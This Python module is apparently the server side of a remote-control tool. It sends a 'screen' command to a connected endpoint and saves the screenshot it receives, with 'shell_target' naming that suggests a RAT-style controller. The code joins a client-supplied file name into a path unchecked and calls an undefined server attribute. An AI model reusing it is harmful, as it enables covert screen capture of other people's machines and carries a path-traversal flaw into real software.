import socket
import shutil
import glob
import os

from Modules.logger import init_logger
from Modules.utils import Handlers


class Screenshot:
    def __init__(self, path, log_path, endpoint, remove_connection, shell_target):
        self.images = []
        self.endpoint = endpoint
        self.path = path
        self.log_path = log_path
        self.remove_connection = remove_connection
        self.shell_target = shell_target
        self.screenshot_path = f"{os.path.join(self.path, self.endpoint.ident)}\\images"
        if not os.path.exists(self.screenshot_path):
            os.makedirs(self.screenshot_path, exist_ok=True)

        self.logger = init_logger(self.log_path, __name__)
        self.handlers = Handlers(self.log_path, self.path)
        self.local_dir = self.handlers.handle_local_dir(self.endpoint)

    def bytes_to_number(self, b: int) -> int:
        res = 0
        for i in range(4):
            res += b[i] << (i * 8)
        return res

    def handle_errors(self, e):
        self.logger.debug(f"Error: {e}")
        self.logger.debug(f"Calling remove_lost_connection({self.endpoint})...")
        self.server.remove_lost_connection(self.endpoint)

    def get_file_name(self):
        try:
            self.filename = self.endpoint.conn.recv(1024)
            self.filename = str(self.filename).strip("b'")
            self.endpoint.conn.send("Filename OK".encode())
            self.screenshot_file_path = os.path.join(self.screenshot_path, self.filename)

        except (ConnectionError, socket.error) as e:
            self.handle_errors(e)
            return False

    def get_file_size(self):
        try:
            self.size = self.endpoint.conn.recv(4)
            self.size = self.bytes_to_number(self.size)

        except (ConnectionError, socket.error) as e:
            self.handle_errors(e)
            return False

    def get_file_content(self):
        current_size = 0
        buffer = b""
        try:
            self.logger.debug(f"Opening {self.filename} for writing...")
            with open(self.screenshot_file_path, 'wb') as file:
                self.logger.debug(f"Fetching file content...")
                while current_size < self.size:
                    try:
                        data = self.endpoint.conn.recv(1024)
                        if not data:
                            break

                        if len(data) + current_size > self.size:
                            data = data[:self.size - current_size]

                        buffer += data
                        current_size += len(data)
                        file.write(data)

                    except IOError as e:
                        self.logger.info(f"Error Writing to {self.screenshot_file_path}, {e}")
                        return False

                    except (ConnectionError, socket.error) as e:
                        self.handle_errors(e)
                        return False

            self.logger.info(f"get_file_content completed.")

        except FileExistsError:
            self.logger.debug(f"Passing file exists error...")
            pass

    def confirm(self):
        try:
            self.logger.debug(f"Waiting for answer from client...")
            self.ans = self.endpoint.conn.recv(1024).decode()
            self.logger.debug(f"{self.endpoint.ip}: {self.ans}")

        except (ConnectionError, socket.error) as e:
            self.handle_errors(e)
            return False

    def finish(self):
        try:
            self.logger.debug(f"Finding the latest jpg file...")
            latest_file = max(glob.glob(os.path.join(self.screenshot_path, '*.jpg')), key=os.path.getmtime)
            self.last_screenshot = os.path.basename(latest_file)

            if self.endpoint.conn == self.shell_target:
                src = os.path.join(self.screenshot_path, self.last_screenshot)
                shutil.move(src, self.local_dir)

            # os.startfile(self.last_sc_path)
            self.logger.info(f"Screenshot completed.")

        except ValueError:
            pass

    def run(self):
        self.logger.info(f"Running screenshot...")

        try:
            self.logger.debug(f"Sending screen command to client...")
            self.endpoint.conn.send('screen'.encode())

        except (ConnectionError, socket.error) as e:
            self.logger.debug(f"Error: {e}.")
            self.logger.debug(f"Calling remove_lost_connection({self.endpoint}...")
            self.remove_connection(self.endpoint)
            return False

        self.logger.debug(f"Calling get_file_name...")
        self.get_file_name()
        self.logger.debug(f"Calling get_file_size...")
        self.get_file_size()
        self.logger.debug(f"Calling get_file_content...")
        self.get_file_content()
        self.logger.debug(f"Calling finish...")
        self.finish()

        return True
